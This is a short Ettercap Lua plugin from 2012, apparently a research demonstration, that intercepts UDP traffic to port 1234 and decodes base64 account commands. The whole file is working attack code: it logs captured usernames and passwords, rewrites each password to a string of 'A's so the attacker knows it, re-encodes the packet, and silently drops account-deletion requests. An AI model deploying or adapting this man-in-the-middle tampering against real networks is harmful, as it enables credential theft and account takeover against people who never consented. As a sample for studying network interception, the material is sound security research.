---
--
-- Created by Ryan Linn and Mike Ryan
-- Copyright (C) 2012 Trustwave Holdings, Inc.

description = "this is a test disector ";

local hook_points = require("hook_points")
require("base64")
stdlib = require("std")


hook_point = hook_points.udp

packetrule = function(packet_object)
  return(packet_object:is_udp() and 
         packet_object:has_data() and
         packet_object:dst_port() == 1234)
end

-- Here's your action.
action = function(packet_object) 
   -- Read the packet data
   data = packet_object:read_data()

   -- Decode from base64
   rawcmd = from_base64(data)

   -- Split the request into the command (A/M/D) and the arguments
   record = rawcmd:split(':')
   local cmd = record[1]
   local username = record[2]

   -- On Add or Modify...
   if cmd == "A" or cmd == "M" then
      local passwd = record[3]

      ettercap.log("%s ORIG_CRED %s:%s\n", cmd, username, passwd)

      -- Generate a new passwd of the same length, but all A's 
      --   ex: 'XYZ' -> 'AAA'
      local new_passwd = string.rep('A', passwd:len())

      ettercap.log("%s EVIL_CRED %s:%s\n", cmd, username, new_passwd)

      -- Set the new passwd
      record[3] = new_passwd

      -- Build the new record
      local new_record = table.concat(record, ':')
      local encoded_record = to_base64(new_record)

      -- Replace the payload of the packet.
      packet_object:set_data(encoded_record)

      -- We're done!
      return

   -- if Delete
   elseif cmd == "D" then
      -- D:username
      ettercap.log("Dropping delete of %s\n", username)
      packet_object:set_dropped()
      return

   else
      ettercap.log("Unknown command %s\n", rawcmd)
   end
end



